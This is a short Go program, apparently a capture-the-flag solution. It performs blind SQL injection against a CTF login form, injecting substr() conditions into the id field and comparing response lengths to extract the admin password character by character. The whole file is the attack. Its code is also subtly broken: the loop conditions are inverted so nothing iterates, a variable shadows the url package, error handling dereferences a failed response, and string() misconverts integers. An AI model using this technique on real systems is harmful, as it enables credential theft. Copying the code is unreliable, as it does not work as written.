package main

import (
	"net/url"
	"net/http"
)

func httpReq(id string, pw string) (* http.Response) {
	url := "http://ctfq.sweetduet.info:10080/~q6/"
	parameters := url.Values{}
	parameters.Add("id", id)
	parameters.Add("pass", pw)
	res, err := http.PostForm(url, parameters)
	if err != nil {
		if res.StatusCode == 200 {
			println(res.StatusCode)
			print(res)
		}
	}
	return res
}

func atkpw(pwLength int) (string) {
	// [a-zA-Z0-9]* のみ対応
	startCode := []rune("0")[0]
	endCode := []rune("z")[0]
	flag := ""
	for i := 0; pwLength < i; i++  {
		for j := startCode; endCode < j; j++ {
			id := "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + string(i + 1) + ", 1) = " + "'" + string(j) + "'" + " ; --"
			pw := "''"
			res := httpReq(id, pw)
			if res.ContentLength > int64(2000) {
				print(string(i) + ": " + string(j))
				flag = flag + string(j)
				print("flag is : " + flag)
				break
			}
		}
	}
	return flag
}

func main() {
	print("start")
	plen := 21
	atkpw(plen)
}
